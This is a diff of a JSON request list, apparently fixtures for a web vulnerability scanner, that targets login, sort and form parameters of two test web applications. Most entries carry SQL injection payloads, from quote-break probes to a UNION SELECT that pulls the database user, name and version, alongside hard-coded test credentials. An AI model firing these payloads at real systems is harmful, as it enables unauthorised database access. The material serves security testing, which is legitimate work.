@@ -1,380 +1,4302 @@
 [
   {
+    "url": "https://app9.com/index-test.php/site/login", 
+    "loginurl": "", 
+    "type": "POST", 
+    "loginrequired": "false", 
+    "param": {
+      "LoginForm[username]": [
+        "test'#"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }
+  }, 
+  {
+    "url": "https://app9.com/index-test.php/site/login", 
+    "loginurl": "", 
+    "type": "POST", 
+    "loginrequired": "false", 
+    "param": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test'#"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }
+  }, 
+  {
+    "url": "https://app9.com/index-test.php/site/login", 
+    "loginurl": "", 
+    "type": "POST", 
+    "loginrequired": "false", 
+    "param": {
+      "LoginForm[username]": [
+        "test%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }
+  }, 
+  {
+    "url": "https://app9.com/index-test.php/site/login", 
+    "loginurl": "", 
+    "type": "POST", 
+    "loginrequired": "false", 
+    "param": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }
+  }, 
+  {
     "loginpayload": {
-      "username": [
-        "admin@admin.com"
+      "LoginForm[username]": [
+        "test"
       ], 
-      "password": [
-        "admin"
+      "LoginForm[password]": [
+        "test"
       ], 
-      "dologin": [
-        "1"
+      "LoginForm[rememberMe]": [
+        "0"
       ]
     }, 
-    "url": "https://app4.com/query.php", 
+    "url": "https://app9.com/index-test.php/docs", 
     "param": {
-      "sort": [
-        "desc"
+      "Docs_sort": [
+        "createDate"
       ], 
-      "open": [
-        "1"
-      ], 
-      "order": [
-        "priority_name"
-      ], 
-      "projects": [
-        "3'"
-      ], 
-      "op": [
-        "doquery"
+      "Media_sort": [
+        "uploadedBy%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
       ]
     }, 
     "headers": {
-      "referer": "https://app4.com/index.php", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
     }, 
-    "newurl": "https://app4.com/query.php?sort=desc&open=1&order=priority_name&projects=3'&op=doquery", 
+    "newurl": "https://app9.com/index-test.php/docs?Docs_sort=createDate&Media_sort=uploadedBy%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
     "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
     "type": "GET"
   }, 
   {
     "loginpayload": {
-      "username": [
-        "admin@admin.com"
+      "LoginForm[username]": [
+        "test"
       ], 
-      "password": [
-        "admin"
+      "LoginForm[password]": [
+        "test"
       ], 
-      "dologin": [
-        "1"
+      "LoginForm[rememberMe]": [
+        "0"
       ]
     }, 
-    "url": "https://app4.com/bug.php", 
+    "url": "https://app9.com/index-test.php/docs", 
     "param": {
-      "project": [
-        "1'"
+      "Docs_sort": [
+        "createdBy"
       ], 
-      "op": [
-        "add"
+      "Media_sort": [
+        "uploadedBy%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
       ]
     }, 
     "headers": {
-      "referer": "https://app4.com/index.php", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
     }, 
-    "newurl": "https://app4.com/bug.php?project=1'&op=add", 
+    "newurl": "https://app9.com/index-test.php/docs?Docs_sort=createdBy&Media_sort=uploadedBy%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
     "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
     "type": "GET"
   }, 
   {
     "loginpayload": {
-      "username": [
-        "admin@admin.com"
+      "LoginForm[username]": [
+        "test"
       ], 
-      "password": [
-        "admin"
+      "LoginForm[password]": [
+        "test"
       ], 
-      "dologin": [
-        "1"
+      "LoginForm[rememberMe]": [
+        "0"
       ]
     }, 
-    "url": "https://app4.com/admin/project.php", 
+    "url": "https://app9.com/index-test.php/docs", 
+    "param": {
+      "Docs_sort": [
+        "createDate"
+      ], 
+      "Media_sort": [
+        "createDate%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "newurl": "https://app9.com/index-test.php/docs?Docs_sort=createDate&Media_sort=createDate%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "GET"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/update", 
     "param": {
       "id": [
-        "1'"
-      ], 
-      "op": [
-        "edit"
+        "8%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
       ]
     }, 
     "headers": {
-      "referer": "https://app4.com/admin/project.php", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
     }, 
-    "newurl": "https://app4.com/admin/project.php?id=1'&op=edit", 
+    "newurl": "https://app9.com/index-test.php/media/update?id=8%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
     "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
     "type": "GET"
   }, 
   {
     "loginpayload": {
-      "username": [
-        "admin@admin.com"
+      "LoginForm[username]": [
+        "test"
       ], 
-      "password": [
-        "admin"
+      "LoginForm[password]": [
+        "test"
       ], 
-      "dologin": [
-        "1"
-      ]
-    }, 
-    "url": "https://app4.com/admin/priority.php", 
-    "param": {
-      "priority_id": [
-        "2'"
-      ], 
-      "op": [
-        "del"
-      ]
-    }, 
-    "headers": {
-      "referer": "https://app4.com/admin/priority.php", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
-    }, 
-    "newurl": "https://app4.com/admin/priority.php?priority_id=2'&op=del", 
-    "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
-    "type": "GET"
-  }, 
-  {
-    "loginpayload": {
-      "username": [
-        "admin@admin.com"
-      ], 
-      "password": [
-        "admin"
-      ], 
-      "dologin": [
-        "1"
-      ]
-    }, 
-    "url": "https://app4.com/admin/os.php", 
-    "param": {
-      "sort": [
-        "desc'"
-      ], 
-      "order": [
-        "sort_order"
-      ], 
-      "page": [
+      "LoginForm[rememberMe]": [
         "0"
       ]
     }, 
-    "headers": {
-      "referer": "https://app4.com/admin/os.php", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+    "url": "https://app9.com/index-test.php/media/1006", 
+    "param": {
+      "id": [
+        "10%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
     }, 
-    "newurl": "https://app4.com/admin/os.php?sort=desc'&order=sort_order&page=0", 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "newurl": "https://app9.com/index-test.php/media/update?id=10%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
     "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
     "type": "GET"
   }, 
   {
     "loginpayload": {
-      "username": [
-        "admin@admin.com"
+      "LoginForm[username]": [
+        "test"
       ], 
-      "password": [
-        "admin"
+      "LoginForm[password]": [
+        "test"
       ], 
-      "dologin": [
-        "1"
+      "LoginForm[rememberMe]": [
+        "0"
       ]
     }, 
-    "url": "https://app4.com/admin/status.php", 
+    "url": "https://app9.com/index-test.php/quotes/indexInvoice", 
     "param": {
-      "op": [
-        "edit"
-      ], 
-      "status_id": [
-        "1'"
+      "Quote_sort": [
+        "invoiceStatus%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
       ]
     }, 
     "headers": {
-      "referer": "https://app4.com/admin/status.php", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
     }, 
-    "newurl": "https://app4.com/admin/status.php?op=edit&status_id=1'", 
+    "newurl": "https://app9.com/index-test.php/quotes/indexInvoice?Quote_sort=invoiceStatus%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
     "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
     "type": "GET"
   }, 
   {
     "loginpayload": {
-      "username": [
-        "admin@admin.com"
+      "LoginForm[username]": [
+        "test"
       ], 
-      "password": [
-        "admin"
+      "LoginForm[password]": [
+        "test"
       ], 
-      "dologin": [
-        "1"
+      "LoginForm[rememberMe]": [
+        "0"
       ]
     }, 
-    "url": "https://app4.com/admin/severity.php", 
+    "url": "https://app9.com/index-test.php/accounts", 
     "param": {
-      "severity_id": [
-        "7'"
-      ], 
-      "op": [
-        "edit"
+      "Accounts_sort": [
+        "assignedTo.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
       ]
     }, 
     "headers": {
-      "referer": "https://app4.com/admin/severity.php", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
     }, 
-    "newurl": "https://app4.com/admin/severity.php?severity_id=7'&op=edit", 
+    "newurl": "https://app9.com/index-test.php/accounts?Accounts_sort=assignedTo.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
     "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
     "type": "GET"
   }, 
   {
     "loginpayload": {
-      "username": [
-        "admin@admin.com"
+      "LoginForm[username]": [
+        "test"
       ], 
-      "password": [
-        "admin"
+      "LoginForm[password]": [
+        "test"
       ], 
-      "dologin": [
-        "1"
+      "LoginForm[rememberMe]": [
+        "0"
       ]
     }, 
-    "url": "https://app4.com/admin/site.php", 
+    "url": "https://app9.com/index-test.php/actions", 
     "param": {
-      "site_id": [
-        "5'"
-      ], 
-      "op": [
-        "edit"
+      "Actions_sort": [
+        "assignedTo%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
       ]
     }, 
     "headers": {
-      "referer": "https://app4.com/admin/site.php", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
     }, 
-    "newurl": "https://app4.com/admin/site.php?site_id=5'&op=edit", 
+    "newurl": "https://app9.com/index-test.php/actions?Actions_sort=assignedTo%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
     "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
     "type": "GET"
   }, 
   {
     "loginpayload": {
-      "username": [
-        "admin@admin.com"
+      "LoginForm[username]": [
+        "test"
       ], 
-      "password": [
-        "admin"
+      "LoginForm[password]": [
+        "test"
       ], 
-      "dologin": [
-        "1"
+      "LoginForm[rememberMe]": [
+        "0"
       ]
     }, 
-    "url": "https://app4.com/admin/resolution.php", 
+    "url": "https://app9.com/index-test.php/contacts/savedMaps", 
     "param": {
-      "resolution_id": [
-        "4'"
-      ], 
-      "op": [
-        "edit"
+      "Maps_sort": [
+        "zoom.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
       ]
     }, 
     "headers": {
-      "referer": "https://app4.com/admin/resolution.php", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
     }, 
-    "newurl": "https://app4.com/admin/resolution.php?resolution_id=4'&op=edit", 
+    "newurl": "https://app9.com/index-test.php/contacts/savedMaps?Maps_sort=zoom.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
     "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
     "type": "GET"
   }, 
   {
     "loginpayload": {
-      "username": [
-        "admin@admin.com"
+      "LoginForm[username]": [
+        "test"
       ], 
-      "password": [
-        "admin"
+      "LoginForm[password]": [
+        "test"
       ], 
-      "dologin": [
-        "1"
+      "LoginForm[rememberMe]": [
+        "0"
       ]
     }, 
-    "url": "https://app4.com/admin/database.php", 
+    "url": "https://app9.com/index-test.php/marketing", 
     "param": {
-      "database_id": [
-        "2'"
-      ], 
-      "op": [
-        "edit"
+      "Campaign_sort": [
+        "listId%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
       ]
     }, 
     "headers": {
-      "referer": "https://app4.com/admin/database.php", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
     }, 
-    "newurl": "https://app4.com/admin/database.php?database_id=2'&op=edit", 
+    "newurl": "https://app9.com/index-test.php/marketing?Campaign_sort=listId%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
     "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
     "type": "GET"
   }, 
   {
     "loginpayload": {
-      "username": [
-        "admin@admin.com"
+      "LoginForm[username]": [
+        "test"
       ], 
-      "password": [
-        "admin"
+      "LoginForm[password]": [
+        "test"
       ], 
-      "dologin": [
-        "1"
+      "LoginForm[rememberMe]": [
+        "0"
       ]
     }, 
-    "url": "https://app4.com/admin/group.php", 
+    "url": "https://app9.com/index-test.php/actions", 
     "param": {
-      "group_id": [
-        "7'"
-      ], 
-      "op": [
-        "edit-role"
+      "Actions_sort": [
+        "associationName.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
       ]
     }, 
     "headers": {
-      "referer": "https://app4.com/admin/group.php?op=list-roles", 
-      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
     }, 
-    "newurl": "https://app4.com/admin/group.php?group_id=7'&op=edit-role", 
+    "newurl": "https://app9.com/index-test.php/actions?Actions_sort=associationName.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
     "loginrequired": "true", 
-    "loginurl": "https://app4.com/index.php", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
     "type": "GET"
   }, 
   {
     "loginpayload": {
-      "username": [
-        "admin@admin.com"
+      "LoginForm[username]": [
+        "test"
       ], 
-      "password": [
-        "admin"
+      "LoginForm[password]": [
+        "test"
       ], 
-      "dologin": [
-        "1"
+      "LoginForm[rememberMe]": [
+        "0"
       ]
     }, 
-    "url": "https://app4.com/admin/user.php", 
+    "url": "https://app9.com/index-test.php/actions", 
     "param": {
-      "groupfilter": [
+      "Actions_sort": [
+        "associationName.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "newurl": "https://app9.com/index-test.php/actions?Actions_sort=associationName.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "GET"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/actions/viewAll", 
+    "param": {
+      "Actions_sort": [
+        "assignedTo%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "newurl": "https://app9.com/index-test.php/actions/viewAll?Actions_sort=assignedTo%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "GET"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/marketing", 
+    "param": {
+      "Campaign_sort": [
+        "active.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "newurl": "https://app9.com/index-test.php/marketing?Campaign_sort=active.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "GET"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/actions/viewGroup", 
+    "param": {
+      "Actions_sort": [
+        "associationName%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "newurl": "https://app9.com/index-test.php/actions/viewGroup?Actions_sort=associationName%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "GET"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/lists", 
+    "param": {
+      "Actions_sort": [
+        "completedBy.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "newurl": "https://app9.com/index-test.php/actions/viewGroup?Actions_sort=completedBy.desc%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "GET"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/site/createRecords", 
+    "param": {
+      "ret": [
+        "opportunities%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "newurl": "https://app9.com/index-test.php/site/createRecords?ret=opportunities%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "GET"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/myContacts", 
+    "param": {
+      "Contacts_sort": [
+        "email%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "newurl": "https://app9.com/index-test.php/contacts/myContacts?Contacts_sort=email%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "GET"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/newContacts", 
+    "param": {
+      "Contacts_sort": [
+        "name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "newurl": "https://app9.com/index-test.php/contacts/newContacts?Contacts_sort=name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+", 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "GET"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/profile/settings", 
+    "param": {
+      "preferences[gridViewRowColorEven]": [
+        "a"
+      ], 
+      "preferences[pageHeaderBgColor]": [
+        "a"
+      ], 
+      "preferences[menuTextColor]": [
+        "a"
+      ], 
+      "Profile[allowPost]": [
+        "1%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "preferences[gridViewRowColorOdd]": [
+        "a"
+      ], 
+      "preferences[menuBgColor]": [
+        "a"
+      ], 
+      "preferences[backgroundColor]": [
+        "a"
+      ], 
+      "preferences[pageHeaderTextColor]": [
+        "a"
+      ], 
+      "preferences[activityFeedWidgetBgColor]": [
+        "a"
+      ]
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/quotes/index", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/quotes", 
+    "param": {
+      "Quote[assignedTo]": [
+        "a"
+      ], 
+      "Quote[name]": [
+        "a"
+      ], 
+      "Quote[leadSource]": [
+        "a"
+      ], 
+      "Quote[description]": [
+        "a"
+      ], 
+      "Quote[salesStage]": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/products/index", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/products/index", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/profile/settings/3", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
